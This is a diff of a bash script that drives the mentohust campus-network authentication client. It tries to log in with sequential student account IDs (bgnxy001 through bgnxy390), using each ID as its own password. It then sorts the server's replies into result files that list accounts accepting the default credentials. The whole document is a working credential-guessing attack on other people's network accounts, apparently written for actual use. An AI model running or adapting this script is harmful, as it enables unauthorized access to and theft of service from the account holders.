@@ -1,58 +1,80 @@
 #!/bin/bash
 number=
-tempfile=menlog.log
+#连接产生的记录文件
+tempfile=mentemp.tmp
+logfile=menlog.log
 #结果保存的文件
-RESULT=sunet
-RESULTx=sunetx
+RESULT=result.re
+RESULTx=resultx.re
+
 stunum3=bgnxy
-stunum4=291
-i=1
-> $tempfile
-while [ $stunum4 -le 390 ]
-do
-	if [ $stunum4 -le 9 ] ; then
-	number=$stunum3"00"$stunum4
-	else
-		if [ $stunum4 -le 99 ] ; then
-		number=$stunum3"0"$stunum4
-		else
-		number=$stunum3$stunum4
-		fi
-	fi	
-	echo $number
-#	echo $stunum4
+stunum4=1
 
-
-#check 
-	sudo mentohust -u$number -p$number -l1 >> $tempfile
+function connect() {
+	sudo mentohust -u$number -p$number -l1 -b0 -t$DELAY > $tempfile
+	#sleep $DELAY
+	sudo mentohust -k >/dev/null 2>&1
+	echo `date` >> $logfile
+	echo "sudo mentohust -u$number -p$number -l1 -b0 -t$DELAY" >> $logfile
+	cat $tempfile >> $logfile
 	sleep 8
 	sudo mentohust -k >/dev/null
 	info=`grep "提示" $tempfile | tail -1`
+	return $info
+}
+
+function get_result() {
 	echo $info | grep "在线用户数量上限" 
 	if [ $? -eq 0 ] ;then
-	echo $number >>sunet
+	echo $number >>$RESULT
 	fi
-	echo $info | grep "不允许的接入方式" 
+	echo $info | grep "不允许抢占" 
 	if [ $? -eq 0 ] ;then
-	echo $number >>sunet
-        fi
+	echo $number >>$RESULT
+	fi
 	echo $info | grep "接入方式" 
 	if [ $? -eq 0 ] ;then
-	echo $number >>sunet
+	echo $number >>$RESULTx
+	#sudo mentohust -k
+        fi
+	echo $info | grep "余额已不足" 
+	if [ $? -eq 0 ] ;then
+	echo $number >>$RESULT
+	#sudo mentohust -k
         fi
 	echo $info | grep "您当前使用的服务" 
 	if [ $? -eq 0 ] ;then
-	echo $number >>sunet
+	echo $number >>$RESULTx
+	#sudo mentohust -k
         fi
+}
 
-	i=`expr $stunum4 + 1`
-	#if [ $i -le 9 ] ; then
-	#stunum4=0$i
-	#else
-	stunum4=$i
-	#fi
-#	sleep 1
-done
-#sleep 2
-#done
+function main() {
+	> $tempfile
+	> $logfile
+	i=1
+	sudo mentohust -k >/dev/null 2>&1
+	while [ $stunum4 -le 390 ]
+	do
+		if [ $stunum4 -le 9 ] ; then
+		number=$stunum3"00"$stunum4
+		else
+			if [ $stunum4 -le 99 ] ; then
+			number=$stunum3"0"$stunum4
+			else
+			number=$stunum3$stunum4
+			fi
+		fi	
+		echo $number
+	#	echo $stunum4
+
+		info=`connect` 
+		get_result
+
+		i=`expr $stunum4 + 1`
+		stunum4=$i
+	done
+}
+
+main
 exit 0
